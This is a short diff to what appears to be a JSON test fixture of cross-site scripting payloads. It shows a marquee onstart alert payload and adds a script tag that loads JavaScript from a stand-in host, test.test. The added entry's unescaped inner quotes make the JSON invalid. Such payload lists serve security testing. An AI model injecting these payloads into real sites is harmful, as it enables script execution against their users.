@@ -26,5 +26,9 @@
 { 
     "id" : "7", 
     "data" : "<marquee onstart=alert('XSS')>"
+},
+{ 
+    "id" : "8", 
+    "data" : "<script src="http://test.test/xss.js"></script>"
 }
 ]
